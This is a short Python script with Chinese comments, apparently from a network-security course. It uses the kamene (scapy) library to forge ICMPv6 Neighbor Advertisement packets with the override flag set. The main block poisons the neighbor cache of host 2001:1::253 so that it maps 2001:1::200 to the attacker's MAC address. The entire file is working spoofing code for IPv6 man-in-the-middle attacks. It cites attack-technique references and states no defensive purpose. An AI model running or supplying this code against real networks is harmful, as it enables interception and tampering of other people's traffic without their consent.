#!/usr/bin/env python3
# -*- coding=utf-8 -*-

# IPv6参考文档
# https://www.idsv6.de/Downloads/IPv6PacketCreationWithScapy.pdf
# https://www.ernw.de/download/Advanced%20Attack%20Techniques%20against%20IPv6%20Networks-final.pdf


import logging

logging.getLogger("kamene.runtime").setLevel(logging.ERROR)  # 清除报错
from kamene.all import *
from tools.get_mac_netifaces import get_mac_address
from icmpv6_ns import icmpv6_ns
from tools.ipv6_tools import mac_to_ipv6_linklocal


def icmpv6_na(spoof_host, masquerade_host, ifname):  # 发送NA主要用于毒化
    ll_mac = get_mac_address(ifname)  # 获取本机接口MAC地址
    # ----------以太网头部 - ---------
    # 以太网协议号: 0x86DD(IPv6)
    # 源目MAC为两个节点的单播地址
    # 源为系统本地MAC,Scapy自动产生,目标MAC为被欺骗主机MAC,使用NS获取
    dst_mac = icmpv6_ns(spoof_host, ifname)
    ether = Ether(dst=dst_mac)

    # -----------IPv6头部------------
    # Next Header: 0x3A (ICMPv6)
    # 原地址: 2001:1::200 伪装地址
    # 目的地址: 2001:1::253的Link Local Address,欺骗主机的Link Local Address
    ipv6 = IPv6(src=masquerade_host, dst=mac_to_ipv6_linklocal(dst_mac))
    # R=1 Sender is a router,
    # S=1 advertisement is sent in response to a Neighbor Solicit,
    # O=1 override flag
    # 目标地址: 2001:1::200 伪装地址
    neighbor_advertisements = ICMPv6ND_NA(tgt=masquerade_host,
                                          R=0,  # 我不是路由器
                                          S=0,  # 我不是一个NS的响应
                                          O=1)  # 我要覆盖

    # ----Target Link-Layer Address----
    # 源地址: 本地MAC地址
    src_ll_addr = ICMPv6NDOptDstLLAddr(lladdr=ll_mac)
    # 构建完整数据包
    packet = ether / ipv6 / neighbor_advertisements / src_ll_addr
    # 发送数据包
    sendp(packet, verbose=False)


if __name__ == '__main__':
    # Windows Linux均可使用
    # 欺骗2001:1::253 让它认为2001:1::200的MAC地址为本地攻击者计算机的MAC
    icmpv6_na("2001:1::253", "2001:1::200", "ens33")
